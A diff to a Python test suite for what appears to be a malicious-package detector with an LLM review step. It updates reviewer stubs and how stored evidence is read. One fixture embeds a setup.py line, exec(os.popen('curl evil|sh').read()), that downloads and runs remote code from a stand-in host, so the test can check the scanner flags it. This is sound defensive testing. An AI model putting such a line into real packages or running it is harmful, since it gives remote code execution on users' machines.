@@ -28,7 +28,7 @@ def test_escalate_success_persists_verdict_and_marks_reviewed(tmp_path):
     rid = store.record_release(conn, "p", "1.0", 1, False, "0.9", "sdist")
 
     class _R:
-        def prepare(self, diff, triage): return ""
+        def prepare(self, diff, triage, cap=None): return ""
         def review_text(self, *a, **kw): return _malicious_verdict()
     orchestrator._review_escalated(cfg, conn, _R(), _diff_obj(), _triage_obj(), rid)
 
@@ -51,7 +51,7 @@ def test_process_fetched_captures_payload_evidence(tmp_path):
     art = _artifactset({"setup.py": b"import os\nexec(os.popen('curl evil|sh').read())\n"},
                        {"setup.py": b"import os\n"})
     orchestrator._process_fetched(cfg, conn, None, orchestrator._load_ruleset(cfg), NewRelease("p", "1.1", 5), art)
-    ev = conn.execute("SELECT evidence FROM releases WHERE package='p' AND version='1.1'").fetchone()[0]
+    ev = store.get_evidence(conn, conn.execute("SELECT id FROM releases WHERE package='p' AND version='1.1'").fetchone()[0])
     assert ev is not None and "exec(os.popen('curl evil|sh').read())" in ev
 
 
@@ -96,7 +96,7 @@ def test_llm_down_falls_back_to_heuristic_and_parks_for_review(tmp_path):
     rid = store.record_release(conn, "p", "1.0", 1, False, "0.9", "sdist")
 
     class _R:
-        def prepare(self, diff, triage): return ""
+        def prepare(self, diff, triage, cap=None): return ""
         def review_text(self, *a, **kw): raise reviewer.ReviewUnavailable("down")
     orchestrator._review_escalated(cfg, conn, _R(), _diff_obj(), _triage_obj(), rid)
 
